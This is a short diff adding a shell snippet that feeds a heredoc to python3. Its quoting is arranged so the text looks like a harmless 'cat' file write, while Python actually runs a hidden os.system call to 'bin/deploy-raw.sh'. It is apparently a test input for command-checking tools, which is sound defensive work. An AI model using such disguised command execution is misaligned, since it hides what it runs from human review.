@@ -1,0 +1,9 @@
+python3 - <<'PY'
+""" "
+cat > /tmp/x <<'EOF'
+"""
+import os; os.system("bash bin/deploy-raw.sh")
+""" "
+EOF
+"""
+PY
